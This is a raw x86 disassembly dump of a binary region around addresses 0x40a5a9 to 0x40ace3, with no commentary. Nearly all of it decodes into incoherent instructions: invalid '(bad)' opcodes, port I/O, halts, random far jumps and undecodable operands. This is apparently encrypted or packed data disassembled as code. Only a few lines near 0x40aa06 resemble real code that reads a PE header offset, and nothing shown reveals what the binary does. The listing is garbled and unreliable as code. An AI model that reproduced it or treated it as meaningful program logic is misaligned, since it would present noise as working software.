  40a5a9:	fidiv  DWORD PTR [edi+0x51]
  40a5ac:	or     bh,BYTE PTR [ecx+0x313603a9]
  40a5b2:	sbb    BYTE PTR gs:[edx],ah
  40a5b5:	sub    DWORD PTR ds:[ebp-0x5f],ebp
  40a5b9:	xor    ch,BYTE PTR [edx-0x4d]
  40a5bc:	or     al,0xef
  40a5be:	cwde   
  40a5bf:	mov    eax,ds:0xe185e962
  40a5c4:	fbstp  TBYTE PTR [eax]
  40a5c6:	hlt    
  40a5c7:	mov    cl,0xe0
  40a5c9:	pop    edx
  40a5ca:	fs mov bl,0x64
  40a5cd:	xchg   ecx,eax
  40a5ce:	pop    esp
  40a5cf:	cmp    DWORD PTR [ebx],ebp
  40a5d1:	sbb    esi,DWORD PTR [eax+0x7a89fe83]
  40a5d7:	jnp    0x40a618
  40a5d9:	addr16 jg 0x40a58d
  40a5dc:	cmp    esp,DWORD PTR [edx]
  40a5de:	aas    
  40a5df:	ror    DWORD PTR [ebx+0x3a],cl
  40a5e2:	out    0xcb,al
  40a5e4:	sahf   
  40a5e5:	pop    eax
  40a5e6:	push   cs
  40a5e7:	adc    ch,ah
  40a5e9:	jg     0x40a624
  40a5eb:	(bad)  
  40a5ec:	(bad)  
  40a5ed:	loopne 0x40a5d1
  40a5ef:	popa   
  40a5f0:	fwait
  40a5f1:	mov    bh,BYTE PTR [eax-0x4af38736]
  40a5f7:	fxch   st(0)
  40a5f9:	(bad)  
  40a5fa:	hlt    
  40a5fb:	ins    BYTE PTR es:[edi],dx
  40a5fc:	xabort 0x95
  40a5ff:	popa   
  40a600:	push   ecx
  40a601:	loope  0x40a614
  40a603:	xor    eax,0x64dd7baf
  40a608:	stos   DWORD PTR es:[edi],eax
  40a609:	popa   
  40a60a:	mov    eax,0xd42e9725
  40a60f:	pop    edx
  40a610:	out    0x6f,eax
  40a612:	cli    
  40a613:	pop    esi
  40a614:	mov    cl,0xb7
  40a616:	inc    edi
  40a617:	std    
  40a618:	neg    DWORD PTR [edx]
  40a61a:	pop    edx
  40a61b:	loope  0x40a66c
  40a61d:	jle    0x40a65f
  40a61f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a620:	dec    ebp
  40a621:	xor    DWORD PTR [esp+esi*4+0x52c51235],ecx
  40a628:	sar    BYTE PTR [edx+0x6c],0x5c
  40a62c:	jnp    0x40a60f
  40a62e:	sub    al,0x76
  40a630:	add    eax,DWORD PTR [eax-0x8]
  40a633:	mov    ah,0x4b
  40a635:	xchg   esi,eax
  40a636:	mov    ?,WORD PTR [eax+0x66dfc657]
  40a63c:	mov    ch,0xba
  40a63e:	and    eax,0xb821a809
  40a643:	mov    esp,0x9ac9aecb
  40a648:	inc    edx
  40a649:	push   es
  40a64a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a64b:	idiv   bh
  40a64d:	dec    esi
  40a64e:	cdq    
  40a64f:	mov    cl,0xb
  40a651:	out    dx,al
  40a652:	sbb    eax,0xe9ba079a
  40a657:	scas   eax,DWORD PTR es:[edi]
  40a658:	add    eax,0xb602d41e
  40a65d:	dec    ebx
  40a65e:	imul   edx,DWORD PTR [ebp-0x1],0xac1bba89
  40a665:	adc    ch,BYTE PTR [edi+0x3436c8ac]
  40a66b:	xchg   ebp,eax
  40a66c:	add    eax,0xd77cbc35
  40a671:	dec    ebx
  40a672:	push   0xffffffa5
  40a674:	leave  
  40a675:	push   ds
  40a676:	sub    esi,DWORD PTR [ebp-0x251db418]
  40a67c:	ins    BYTE PTR es:[edi],dx
  40a67d:	jne    0x40a6e1
  40a67f:	shr    BYTE PTR [ebp+0x2ae83005],1
  40a685:	int    0x26
  40a687:	mov    bh,0x9d
  40a689:	mov    esp,0xb9d500f
  40a68e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a68f:	push   edi
  40a690:	ror    BYTE PTR [edi-0x45e15cf9],1
  40a696:	mov    cl,0xb6
  40a698:	jl     0x40a626
  40a69a:	cli    
  40a69b:	adc    eax,0x804106a5
  40a6a0:	cli    
  40a6a1:	or     dl,BYTE PTR [esi]
  40a6a3:	sub    BYTE PTR [edx+0x1f3c169d],bl
  40a6a9:	sbb    dl,bh
  40a6ab:	xchg   ecx,eax
  40a6ac:	mov    cl,0x6a
  40a6ae:	addr16 rol esp,0xbc
  40a6b2:	js     0x40a68c
  40a6b4:	bound  esp,QWORD PTR [ebx+0x26]
  40a6b7:	test   DWORD PTR [esi],esi
  40a6b9:	lea    ebx,[edi-0x5d]
  40a6bc:	pop    ebp
  40a6bd:	outs   dx,DWORD PTR ds:[esi]
  40a6be:	lahf   
  40a6bf:	push   ebx
  40a6c0:	int3   
  40a6c1:	mov    eax,ds:0x21487f74
  40a6c6:	add    DWORD PTR [ebx-0x38],0xcd18d16
  40a6cd:	cdq    
  40a6ce:	iret   
  40a6cf:	in     al,0x3c
  40a6d1:	jl     0x40a6dd
  40a6d3:	pop    ebx
  40a6d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6d5:	(bad)  
  40a6d6:	dec    eax
  40a6d7:	hlt    
  40a6d8:	rol    BYTE PTR [ebp-0x1638fc12],cl
  40a6de:	sbb    al,0x3
  40a6e0:	add    BYTE PTR [eax],al
  40a6e2:	in     eax,0x96
  40a6e4:	not    BYTE PTR [ebp+esi*2+0x15776574]
  40a6eb:	sub    dh,BYTE PTR [eax+edi*4+0x4e]
  40a6ef:	int    0x55
  40a6f1:	adc    BYTE PTR [eax-0x17],bh
  40a6f4:	jle    0x40a774
  40a6f6:	jp     0x40a775
  40a6f8:	jle    0x40a778
  40a6fa:	cmove  edx,ebp
  40a6fd:	shl    BYTE PTR [edi+0x581fe32d],1
  40a703:	jmp    0x1eb77ad2
  40a708:	mov    bh,0x66
  40a70a:	loope  0x40a6e6
  40a70c:	push   es
  40a70d:	fld    TBYTE PTR [edi-0xf699213]
  40a713:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40a715:	btr    DWORD PTR [edx-0x60],esi
  40a719:	sub    cl,BYTE PTR ds:0xfd8356a6
  40a71f:	cmp    esp,0x695eef98
  40a725:	pop    eax
  40a726:	(bad)  
  40a727:	dec    ebx
  40a729:	mov    bh,0x21
  40a72b:	jmp    0xc69b6260
  40a730:	add    dl,dl
  40a732:	xchg   edi,eax
  40a733:	fnstcw WORD PTR [edi]
  40a735:	aaa    
  40a736:	and    al,0xcb
  40a738:	jbe    0x40a78f
  40a73a:	mov    cl,bh
  40a73c:	xlat   BYTE PTR ds:[ebx]
  40a73d:	xor    al,BYTE PTR [eax-0x7c]
  40a740:	stos   BYTE PTR es:[edi],al
  40a741:	push   ecx
  40a742:	fdivr  st,st(7)
  40a744:	test   eax,0x8a81c6a4
  40a749:	adc    al,0x9a
  40a74b:	sub    DWORD PTR [esi+ebp*4],edi
  40a74e:	sbb    BYTE PTR ds:0x5a16e52c,ah
  40a754:	and    ebx,0xffffff80
  40a757:	pop    edx
  40a758:	lock or ebx,ebp
  40a75b:	repz sbb al,0xc9
  40a75e:	add    al,0x68
  40a760:	add    edx,DWORD PTR [edx]
  40a762:	cmc    
  40a763:	cmp    esi,DWORD PTR [edi-0x5db50ee4]
  40a769:	pusha  
  40a76a:	and    eax,0x72369015
  40a76f:	in     eax,dx
  40a770:	stos   BYTE PTR es:[edi],al
  40a771:	mov    eax,0x598d59a7
  40a776:	and    cl,cl
  40a778:	mov    ch,0xa5
  40a77a:	sbb    edx,esp
  40a77c:	xor    eax,0x2f931c5d
  40a781:	pushf  
  40a782:	adc    dh,BYTE PTR gs:[si-0x77]
  40a787:	dec    esp
  40a788:	ror    BYTE PTR [edx-0x79b8eb0],cl
  40a78e:	ja     0x40a7af
  40a790:	adc    DWORD PTR [edx],eax
  40a792:	addr16 imul edi,edi,0x46
  40a796:	fbld   TBYTE PTR [ebx]
  40a798:	popa   
  40a799:	cmp    DWORD PTR [eax-0xa],esp
  40a79c:	pop    edx
  40a79d:	mov    ah,0x6
  40a79f:	add    dl,0xa3
  40a7a2:	fadd   st(5),st
  40a7a4:	xor    edx,ebx
  40a7a6:	mov    WORD PTR [edx+0x1d322e25],ss
  40a7ac:	(bad)  
  40a7ad:	and    dl,BYTE PTR [edi]
  40a7af:	rdpmc  
  40a7b1:	mov    WORD PTR [esi],?
  40a7b3:	jnp    0x40a767
  40a7b5:	scas   al,BYTE PTR es:[edi]
  40a7b6:	aad    0x24
  40a7b8:	cs push edx
  40a7ba:	cwde   
  40a7bb:	(bad)  
  40a7bc:	ins    DWORD PTR es:[edi],dx
  40a7bd:	cmp    BYTE PTR [esp+eax*2+0x7f],bh
  40a7c1:	inc    ebx
  40a7c2:	idiv   DWORD PTR [esi-0x4b79d356]
  40a7c8:	xchg   edx,eax
  40a7c9:	add    esp,DWORD PTR [ebx-0x32]
  40a7cc:	inc    edx
  40a7cd:	mov    dh,0x11
  40a7cf:	out    0xab,eax
  40a7d1:	jb     0x40a7f8
  40a7d3:	(bad)  
  40a7d5:	cmp    BYTE PTR [ecx],ah
  40a7d7:	xchg   edi,eax
  40a7d8:	adc    BYTE PTR [esi+0x1],ah
  40a7db:	mov    dl,0xd1
  40a7dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a7de:	mov    eax,ds:0xd846e74a
  40a7e3:	loopne 0x40a76e
  40a7e5:	sbb    al,0x29
  40a7e7:	enter  0x7358,0xdf
  40a7eb:	cli    
  40a7ec:	push   edi
  40a7ed:	cwde   
  40a7ee:	pop    esp
  40a7ef:	jle    0x40a868
  40a7f1:	or     bl,cl
  40a7f3:	test   eax,0x1cc6a47d
  40a7f8:	aas    
  40a7f9:	dec    edx
  40a7fa:	out    0x7b,eax
  40a7fc:	fbstp  TBYTE PTR [edi-0x3f]
  40a7ff:	div    DWORD PTR [ecx-0x65174769]
  40a805:	ins    BYTE PTR es:[edi],dx
  40a806:	js     0x40a885
  40a808:	mov    ecx,0xd34c2b47
  40a80d:	push   ds
  40a80e:	loop   0x40a7a0
  40a810:	call   DWORD PTR [edi-0x52]
  40a813:	ins    DWORD PTR es:[edi],dx
  40a814:	sub    eax,0xb2126721
  40a819:	leave  
  40a81a:	outs   dx,BYTE PTR ds:[esi]
  40a81b:	pop    ebp
  40a81c:	mov    DWORD PTR [ecx-0x3a],ebp
  40a81f:	(bad)  
  40a820:	sahf   
  40a821:	add    al,0xc4
  40a823:	out    dx,al
  40a824:	xchg   ecx,eax
  40a825:	sti    
  40a826:	adc    edi,esi
  40a828:	push   di
  40a82a:	add    ebx,DWORD PTR [ebx+eiz*1-0x4f793818]
  40a831:	(bad)  
  40a832:	jne    0x40a7f5
  40a834:	sbb    BYTE PTR [eax],bl
  40a836:	and    eax,0x4c1a0504
  40a83b:	mov    ebp,0x39d92e81
  40a840:	test   esi,edi
  40a842:	hlt    
  40a843:	not    BYTE PTR [edi+0x77a66397]
  40a849:	sbb    DWORD PTR [ebx],edx
  40a84b:	or     al,0x2d
  40a84d:	jmp    0x40a832
  40a84f:	scas   eax,DWORD PTR es:[edi]
  40a850:	mov    bl,0xe7
  40a852:	jl     0x40a7de
  40a854:	stos   DWORD PTR es:[edi],eax
  40a855:	mov    esp,0x4a4a0fbf
  40a85a:	xchg   ebp,eax
  40a85b:	sub    bh,ch
  40a85d:	pop    eax
  40a85e:	xchg   esi,eax
  40a85f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a860:	jmp    0x40a8a9
  40a862:	(bad)  
  40a863:	mov    dh,0x0
  40a865:	push   esp
  40a866:	imul   ebx,DWORD PTR [eax],0xffffffc8
  40a869:	or     BYTE PTR [eax+0x51af4d3c],ah
  40a86f:	adc    BYTE PTR [ecx-0xe],dl
  40a872:	(bad)  
  40a873:	sub    DWORD PTR [ecx+eax*1],eax
  40a876:	cmp    ax,0x7708
  40a87a:	and    esi,ebp
  40a87c:	fs inc ecx
  40a87e:	mov    al,0xbd
  40a880:	(bad)  
  40a881:	pop    ss
  40a882:	int3   
  40a883:	cmp    dl,ch
  40a885:	cmp    edx,ebp
  40a887:	pop    edi
  40a888:	pop    edi
  40a889:	dec    ebp
  40a88a:	and    dl,dl
  40a88c:	lea    ebx,[ebx]
  40a88e:	lock into 
  40a890:	sub    eax,0xab384442
  40a895:	mov    al,ds:0xf627bd1a
  40a89a:	jge    0x40a917
  40a89c:	jo     0x40a894
  40a89e:	cmp    edx,DWORD PTR [eax-0x11b3c149]
  40a8a4:	shl    DWORD PTR [edx],cl
  40a8a6:	sub    eax,DWORD PTR [ebx+0x60]
  40a8a9:	lods   eax,DWORD PTR ds:[esi]
  40a8aa:	jae    0x40a922
  40a8ac:	xor    al,0x62
  40a8ae:	dec    edi
  40a8af:	sbb    al,0x92
  40a8b1:	lods   al,BYTE PTR ds:[esi]
  40a8b2:	fsubrp st(4),st
  40a8b4:	add    ecx,edi
  40a8b6:	in     al,0x62
  40a8b8:	js     0x40a903
  40a8ba:	sahf   
  40a8bb:	fadd   QWORD PTR [edi+esi*4-0x7]
  40a8bf:	pop    esi
  40a8c0:	mov    ebp,0x37204ce6
  40a8c5:	or     eax,0x322fbf00
  40a8ca:	or     ebp,DWORD PTR [edx+0x62]
  40a8cd:	retf   0x2188
  40a8d0:	mov    al,0x25
  40a8d2:	nop
  40a8d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8d4:	cwde   
  40a8d5:	and    al,0x70
  40a8d7:	jl     0x40a8b4
  40a8d9:	adc    eax,DWORD PTR [eax-0x65747b51]
  40a8df:	jmp    0xf010:0xe71545e8
  40a8e6:	or     al,al
  40a8e8:	pop    es
  40a8e9:	xor    bl,dl
  40a8eb:	fistp  QWORD PTR [edi+0x459f6b6]
  40a8f1:	cld    
  40a8f2:	pop    esi
  40a8f3:	and    DWORD PTR [ebx],ecx
  40a8f5:	(bad)  [eax]
  40a8f7:	mov    DWORD PTR [edx],ebp
  40a8f9:	pusha  
  40a8fa:	std    
  40a8fb:	pop    esp
  40a8fc:	(bad)  
  40a8fe:	cwde   
  40a8ff:	(bad)  
  40a901:	push   0xffffff8d
  40a903:	shl    DWORD PTR [edx+0x3f229e43],0x3d
  40a90a:	lahf   
  40a90b:	ret    0x3c2
  40a90e:	fsubr  QWORD PTR [ebx]
  40a910:	repz test al,0x50
  40a913:	sbb    al,0x98
  40a915:	sub    ch,cl
  40a917:	xchg   BYTE PTR [eax],dl
  40a919:	jle    0x40a919
  40a91b:	cmc    
  40a91c:	call   0x79db:0x93ad91a5
  40a923:	in     eax,dx
  40a924:	fldenv [edx+ecx*4+0x5fc362ad]
  40a92b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a92c:	in     al,0xe6
  40a92e:	popa   
  40a92f:	and    DWORD PTR [edx-0x40],esp
  40a932:	fisub  WORD PTR [esi-0x3e]
  40a935:	and    BYTE PTR [ecx+0x44],bl
  40a938:	shl    DWORD PTR [eax],0x95
  40a93b:	pop    ebx
  40a93c:	or     BYTE PTR [ecx],bl
  40a93e:	std    
  40a93f:	adc    al,0xd1
  40a941:	jge    0x40a931
  40a943:	mul    BYTE PTR [esi]
  40a945:	out    dx,al
  40a946:	xchg   ebx,eax
  40a947:	or     ebx,DWORD PTR [esi+eax*2+0x6a4e28fd]
  40a94e:	adc    BYTE PTR [ecx+edx*2-0x2a13294a],bh
  40a955:	mov    ?,WORD PTR [ebp-0x6d]
  40a958:	cmp    DWORD PTR [ebp+0x4bdac7f0],ecx
  40a95e:	jp     0x40a918
  40a960:	push   ebp
  40a961:	jbe    0x40a9a0
  40a963:	add    al,0x98
  40a965:	sbb    BYTE PTR [ebx+0x4abdaab7],ah
  40a96b:	inc    esp
  40a96c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a96d:	in     eax,dx
  40a96e:	lds    ebx,FWORD PTR [esi+0x6fbff30c]
  40a974:	jne    0x40a941
  40a976:	xchg   edx,eax
  40a977:	adc    DWORD PTR [ebx],esi
  40a979:	cmp    al,al
  40a97b:	inc    edi
  40a97c:	or     al,0x8f
  40a97e:	aam    0xba
  40a980:	jge    0x40a972
  40a982:	pop    esp
  40a983:	pop    esp
  40a984:	dec    edi
  40a985:	imul   ecx,ecx,0x4088b026
  40a98b:	aaa    
  40a98c:	mov    ebp,0x5bc12455
  40a991:	call   0x51813a58
  40a996:	cmp    ecx,ebp
  40a998:	sub    dh,BYTE PTR [eax+0x6b]
  40a99b:	adc    al,0x1e
  40a99d:	in     al,dx
  40a99e:	out    dx,eax
  40a99f:	xchg   BYTE PTR [ecx+0x35],bh
  40a9a2:	repz inc esi
  40a9a4:	add    ch,al
  40a9a6:	test   DWORD PTR ds:0x249652fa,0xdd5ad445
  40a9b0:	mov    fs,WORD PTR [ebx]
  40a9b2:	test   eax,0xf3e0245e
  40a9b7:	shl    BYTE PTR [edx],0x3d
  40a9ba:	lods   eax,DWORD PTR ds:[esi]
  40a9bb:	int3   
  40a9bc:	mov    eax,ds:0xa1d9e1b7
  40a9c1:	pop    ecx
  40a9c2:	mov    ds:0x910ab6d6,al
  40a9c7:	push   ss
  40a9c8:	mov    esi,0xb78c2469
  40a9cd:	cmp    ecx,edx
  40a9cf:	mov    ds:0xf213aeb6,eax
  40a9d4:	jmp    FWORD PTR [ecx+0x60]
  40a9d7:	sar    DWORD PTR [ebp+0x62],0xac
  40a9db:	push   ss
  40a9dc:	adc    ah,ah
  40a9de:	sbb    dl,bl
  40a9e0:	ret    
  40a9e1:	imul   esp,DWORD PTR [eax+0x166f4fd9],0x95df05f7
  40a9eb:	rcr    DWORD PTR [ecx-0x39],1
  40a9ee:	mov    cl,0xa7
  40a9f0:	cwde   
  40a9f1:	jmp    0x40aa05
  40a9f3:	dec    ecx
  40a9f4:	pop    ss
  40a9f5:	or     bh,BYTE PTR [ebx+0x49e743a]
  40a9fb:	jbe    0x40a9f8
  40a9fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9fe:	cmp    DWORD PTR [ecx],eax
  40aa00:	je     0x40ba28
  40aa06:	mov    ecx,DWORD PTR [ebp-0x14]
  40aa09:	mov    eax,DWORD PTR [ebp-0x8]
  40aa0c:	mov    eax,DWORD PTR [eax]
  40aa0e:	mov    eax,DWORD PTR [eax+0x3c]
  40aa11:	lea    ecx,[ecx*8+0x78]
  40aa18:	jmp    0x40ad39
  40aa1d:	dec    ebx
  40aa1e:	mov    bl,BYTE PTR [edi+0x55]
  40aa21:	pop    edi
  40aa22:	jno    0x40aa95
  40aa24:	nop
  40aa25:	retf   0x4daf
  40aa28:	add    esp,esp
  40aa2a:	test   esp,ebp
  40aa2c:	add    eax,0x7e7ef404
  40aa31:	jp     0x40aab0
  40aa33:	jle    0x40aab3
  40aa35:	ret    
  40aa36:	push   0x73
  40aa38:	and    eax,0x2a80e3b4
  40aa3d:	xchg   DWORD PTR [eax+ebp*2-0x7],edx
  40aa41:	fwait
  40aa42:	push   esi
  40aa43:	mov    esi,0x637ecfb2
  40aa48:	call   0x217b:0x38e66b89
  40aa4f:	test   eax,0xe841f854
  40aa54:	leave  
  40aa55:	inc    ecx
  40aa56:	or     ebp,DWORD PTR [ecx-0x33131f5a]
  40aa5c:	mov    edx,0xeac35c69
  40aa61:	fnstcw WORD PTR [edx-0x1c]
  40aa64:	cmc    
  40aa65:	xor    DWORD PTR [edx],ebp
  40aa67:	jl     0x40aa50
  40aa69:	cmp    DWORD PTR [edi+ebp*1],ebx
  40aa6c:	push   edx
  40aa6d:	push   cs
  40aa6e:	(bad)  
  40aa6f:	in     al,0x9b
  40aa71:	lock cdq 
  40aa73:	in     eax,dx
  40aa74:	dec    ebp
  40aa75:	cmp    bl,BYTE PTR [edx]
  40aa77:	cmp    al,dl
  40aa79:	test   DWORD PTR [edi],eax
  40aa7b:	mov    ebx,0xb0f952cb
  40aa80:	pop    ebp
  40aa81:	cmc    
  40aa82:	leave  
  40aa83:	rcr    DWORD PTR [ecx+0x787ca83f],1
  40aa89:	push   edi
  40aa8a:	xor    DWORD PTR [edi+edx*4+0x5c],eax
  40aa8e:	mov    ebx,0x700d3ed8
  40aa93:	inc    esp
  40aa94:	icebp  
  40aa95:	data16 mov ah,0xfb
  40aa98:	xor    al,0x3
  40aa9a:	and    esp,DWORD PTR [ecx]
  40aa9c:	xchg   esp,eax
  40aa9d:	jge    0x40aa5c
  40aa9f:	dec    edi
  40aaa0:	xlat   BYTE PTR ds:[ebx]
  40aaa1:	xor    edi,DWORD PTR [edx-0x30d2f2d5]
  40aaa7:	xor    BYTE PTR [esi-0x6],0x99
  40aaab:	repz xchg ebx,eax
  40aaad:	rcl    DWORD PTR [edx+0x68b79d80],1
  40aab3:	push   cs
  40aab4:	add    DWORD PTR [eax+0x67010dd4],esp
  40aaba:	mov    es,WORD PTR [ebx]
  40aabc:	fadd   QWORD PTR [ecx]
  40aabe:	rcr    BYTE PTR [ebp-0x3201b963],cl
  40aac4:	pop    esp
  40aac5:	(bad)  
  40aac6:	sub    dh,BYTE PTR [edi]
  40aac8:	inc    ecx
  40aac9:	retf   
  40aaca:	cmc    
  40aacb:	fcmove st,st(6)
  40aacd:	push   esp
  40aace:	dec    esp
  40aacf:	mov    ch,BYTE PTR [edx+ecx*4-0x6e651df7]
  40aad6:	mov    ebx,0x2f4c067f
  40aadb:	jmp    0xb93:0xfb44e037
  40aae2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aae3:	jb     0x40aabf
  40aae5:	sub    ebp,DWORD PTR [edx]
  40aae7:	push   esp
  40aae8:	push   ss
  40aae9:	pop    eax
  40aaea:	lea    esi,[eax+edx*4+0x3c]
  40aaee:	xor    DWORD PTR [edx],0xffffffd9
  40aaf1:	std    
  40aaf2:	fadd   QWORD PTR ds:0x965b2f15
  40aaf8:	xlat   BYTE PTR ds:[ebx]
  40aaf9:	cmp    eax,0x88000b83
  40aafe:	mov    edi,0xe29a1fe8
  40ab03:	or     eax,0x739959db
  40ab08:	sub    eax,0x74d19734
  40ab0d:	pop    ebp
  40ab0e:	ret    
  40ab0f:	jmp    0x7759:0x85c5010c
  40ab16:	ins    BYTE PTR es:[edi],dx
  40ab17:	sbb    cl,ah
  40ab19:	cs pop es
  40ab1b:	mov    cl,0x71
  40ab1d:	jae    0x40ab5a
  40ab1f:	dec    edx
  40ab20:	inc    ebp
  40ab21:	(bad)  [esi-0x4b]
  40ab24:	mov    esp,0x56df5c8a
  40ab29:	sub    eax,0x1c5dfe92
  40ab2e:	outs   dx,DWORD PTR ds:[esi]
  40ab2f:	jb     0x40aaee
  40ab31:	mov    eax,0x83e5caa2
  40ab36:	jmp    0x40aac2
  40ab38:	sub    al,0x52
  40ab3a:	or     ebx,edx
  40ab3c:	jg     0x40ab5e
  40ab3e:	push   eax
  40ab3f:	dec    ecx
  40ab40:	xchg   BYTE PTR [edi+0x4c],al
  40ab43:	(bad)  [ebp-0x662bfe0a]
  40ab49:	das    
  40ab4a:	outs   dx,DWORD PTR ds:[esi]
  40ab4b:	imul   ebp,DWORD PTR [eax],0x73
  40ab4e:	ror    DWORD PTR [edi+0x5bb73d9b],1
  40ab54:	stos   DWORD PTR es:[edi],eax
  40ab55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab56:	out    0x55,eax
  40ab58:	shr    BYTE PTR [ebx-0x6d],0xe2
  40ab5c:	xchg   esi,eax
  40ab5d:	pusha  
  40ab5e:	test   eax,0xe011a318
  40ab63:	mov    ebp,DWORD PTR [edx]
  40ab65:	push   esi
  40ab66:	xchg   ecx,eax
  40ab67:	mov    ecx,0x4416825e
  40ab6c:	arpl   WORD PTR [edi+0x18],sp
  40ab6f:	ret    
  40ab70:	jo     0x40abb5
  40ab72:	outs   dx,BYTE PTR ds:[esi]
  40ab73:	jo     0x40ab98
  40ab75:	or     al,0x9e
  40ab77:	shl    esp,1
  40ab79:	inc    ebp
  40ab7a:	stc    
  40ab7b:	fdivr  QWORD PTR [esi+0x46]
  40ab7e:	inc    esp
  40ab7f:	jb     0x40abac
  40ab81:	mov    al,0x32
  40ab83:	pop    esp
  40ab84:	imul   edx,DWORD PTR [esi+0x2dbb5713],0x77
  40ab8b:	or     DWORD PTR [ebp-0x66ac7b],eax
  40ab91:	cmp    ebp,ecx
  40ab93:	mov    ebx,0xdedd2644
  40ab98:	xchg   edx,eax
  40ab99:	rcl    BYTE PTR [ecx-0x11],cl
  40ab9c:	dec    ebx
  40ab9d:	sbb    eax,0xbbbc984f
  40aba2:	out    dx,eax
  40aba3:	out    dx,eax
  40aba4:	or     dh,dl
  40aba6:	jl     0x40ac13
  40aba8:	mov    al,ds:0x83937622
  40abad:	in     al,0xfe
  40abaf:	shr    edi,cl
  40abb1:	sbb    DWORD PTR [ecx-0x1a],esp
  40abb4:	xor    esi,ebx
  40abb6:	lea    ebp,[ebp+0x2285fca6]
  40abbc:	xchg   ebp,eax
  40abbd:	mov    edi,0x8caa2071
  40abc2:	push   es
  40abc3:	mov    dh,BYTE PTR [esp+ebp*2+0x91dd82b]
  40abca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abcb:	imul   esp,DWORD PTR [esi+ecx*2],0x30c62130
  40abd2:	jg     0x40ac19
  40abd4:	shr    esp,1
  40abd6:	fstp   DWORD PTR [bp+di-0x41]
  40abda:	fwait
  40abdb:	mov    edx,DWORD PTR [edi+esi*8+0x61]
  40abdf:	jge    0x40ac05
  40abe1:	je     0x40abfc
  40abe3:	dec    esp
  40abe4:	fistp  WORD PTR [eax]
  40abe6:	sbb    BYTE PTR [ecx+edx*8+0x7e60d7ec],bl
  40abed:	ins    BYTE PTR es:[edi],dx
  40abee:	rcr    BYTE PTR [ebp-0x1],0x6e
  40abf2:	and    al,0xd
  40abf4:	push   esp
  40abf5:	push   edi
  40abf6:	loop   0x40abab
  40abf8:	sbb    al,ah
  40abfa:	pop    ds
  40abfb:	xor    eax,0x6949aa12
  40ac00:	sti    
  40ac01:	fidivr DWORD PTR [edi-0x6c70fcec]
  40ac07:	repz push cs
  40ac09:	int    0x62
  40ac0b:	inc    edi
  40ac0c:	or     al,0x5
  40ac0e:	sbb    eax,0x683d2680
  40ac13:	(bad)  
  40ac14:	dec    eax
  40ac15:	(bad)  
  40ac16:	int3   
  40ac17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac18:	out    dx,eax
  40ac19:	lahf   
  40ac1a:	stos   DWORD PTR es:[edi],eax
  40ac1b:	data16 adc BYTE PTR [edi],dl
  40ac1e:	call   0x9e1e9396
  40ac23:	xchg   edi,eax
  40ac24:	cld    
  40ac25:	jno    0x40ac35
  40ac27:	rcl    DWORD PTR [ecx],0xd2
  40ac2a:	aad    0xa1
  40ac2c:	push   ecx
  40ac2d:	mov    ch,0xad
  40ac2f:	popf   
  40ac30:	ins    BYTE PTR es:[edi],dx
  40ac31:	adc    ecx,0x1c6ad856
  40ac37:	jle    0x40abdb
  40ac39:	out    0x75,eax
  40ac3b:	aam    0x70
  40ac3d:	test   eax,esi
  40ac3f:	mov    dl,BYTE PTR [ecx+0x78e8bf12]
  40ac45:	pop    ds
  40ac46:	call   0x19cc4ef0
  40ac4b:	mov    dl,0xff
  40ac4d:	js     0x40ac66
  40ac4f:	mov    ebx,0x47b50ce9
  40ac54:	jne    0x40ac9f
  40ac56:	xchg   ebx,eax
  40ac57:	add    eax,DWORD PTR [ebx+edi*2-0xe]
  40ac5b:	cld    
  40ac5c:	push   edx
  40ac5d:	nop
  40ac5e:	sub    DWORD PTR [edi],ebp
  40ac60:	xor    al,0xc4
  40ac62:	sbb    edx,DWORD PTR [eax+0x56fcac6e]
  40ac68:	dec    ebp
  40ac69:	(bad)  [edi]
  40ac6b:	cs mov al,0x7
  40ac6e:	cmp    eax,0xc8d6c153
  40ac73:	scas   eax,DWORD PTR es:[edi]
  40ac74:	jmp    0x3bdd828c
  40ac79:	cdq    
  40ac7a:	xchg   edi,eax
  40ac7b:	popf   
  40ac7c:	cmp    DWORD PTR [edi],ebx
  40ac7e:	push   esi
  40ac7f:	imul   edi,ecx,0x37
  40ac82:	and    al,0x9e
  40ac84:	hlt    
  40ac85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac86:	mov    ds:0xdc3699c,eax
  40ac8b:	outs   dx,DWORD PTR ds:[esi]
  40ac8c:	call   edx
  40ac8e:	ja     0x40acd1
  40ac90:	cmp    al,BYTE PTR [edx+edx*2]
  40ac93:	retf   
  40ac94:	daa    
  40ac95:	jne    0x40ac2d
  40ac97:	not    BYTE PTR [ebx+0x2ca403c6]
  40ac9d:	mov    al,ah
  40ac9f:	jecxz  0x40acc4
  40aca1:	inc    ebx
  40aca2:	cmp    BYTE PTR [edi+0x5a],dh
  40aca5:	es pop eax
  40aca7:	dec    edi
  40aca8:	aas    
  40aca9:	retf   
  40acaa:	xor    al,0x6c
  40acac:	cdq    
  40acad:	test   edx,esi
  40acaf:	ficomp WORD PTR [ebx+0x51]
  40acb2:	nop
  40acb3:	repz pusha 
  40acb5:	push   eax
  40acb6:	xchg   DWORD PTR es:[esi-0xa],eax
  40acba:	cmp    ah,BYTE PTR [edi-0x353258bc]
  40acc0:	cmp    al,bl
  40acc2:	xor    eax,0x5255c674
  40acc7:	and    ebx,DWORD PTR [edx-0x4eb11518]
  40accd:	test   DWORD PTR [ebx],edx
  40accf:	or     eax,DWORD PTR [bp+si-0x5402]
  40acd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acd5:	xchg   ecx,eax
  40acd6:	je     0x40ad32
  40acd8:	popf   
  40acd9:	js     0x40acd5
  40acdb:	xor    BYTE PTR [edx+eax*2],al
  40acde:	jmp    0xed696a76
  40ace3:	les    eax,FWORD PTR [esi]
